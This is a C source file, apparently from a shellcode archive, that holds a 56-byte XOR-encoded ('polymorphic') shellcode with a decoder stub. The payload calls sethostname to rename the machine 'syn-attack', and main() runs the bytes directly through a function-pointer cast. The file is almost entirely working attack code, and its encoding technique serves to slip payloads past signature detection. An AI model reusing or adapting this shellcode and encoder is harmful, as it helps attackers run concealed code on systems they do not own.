/*
 * sys_sethostname("syn-attack", strlen("syn-attack"));
 * [*] param_1 = hostname --> "syn-attack"
 * [*] param_2 = hostname length --> 10
 *
 * 56 bytes polymorphic shellcode
 *
 * tesla_ (gandung@ppp.cylab.cmu.edu)
 */

#include <stdio.h>
#include <string.h>

char encoded_host[] = "\xeb\x0d\x5e\x31\xc9\xb1\x24\x80\x36\x5e"
		      "\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff"
		      "\x6f\x9e\xdd\xb2\x5f\xd6\x5a\x7a\x36\x2a"
		      "\x3f\x3d\x35\x36\x30\x73\x3f\x2a\x38\x36"
		      "\x2d\x27\xee\x14\xd7\xbd\xef\x54\x93\xde"
		      "\x6f\x9e\xee\x5f\x93\xde";

int main(void) {
  int hostlen = strlen(encoded_host);
  printf("[+] Using mutation key engine : 0x5e\n");
  printf("[+] Length of this shellcode is : %d bytes\n", hostlen);
  printf("[+] After executing this code, check your hostname at \"/etc/hostname\" or type \"hostname\"\n");
  printf("\t\tin your shell\n");
  (*(void(*)())encoded_host)();
  return 0;
}

/* devilzc0de.org, hacker-newbie.org, sdf.lonestar.org, 1337day.com */
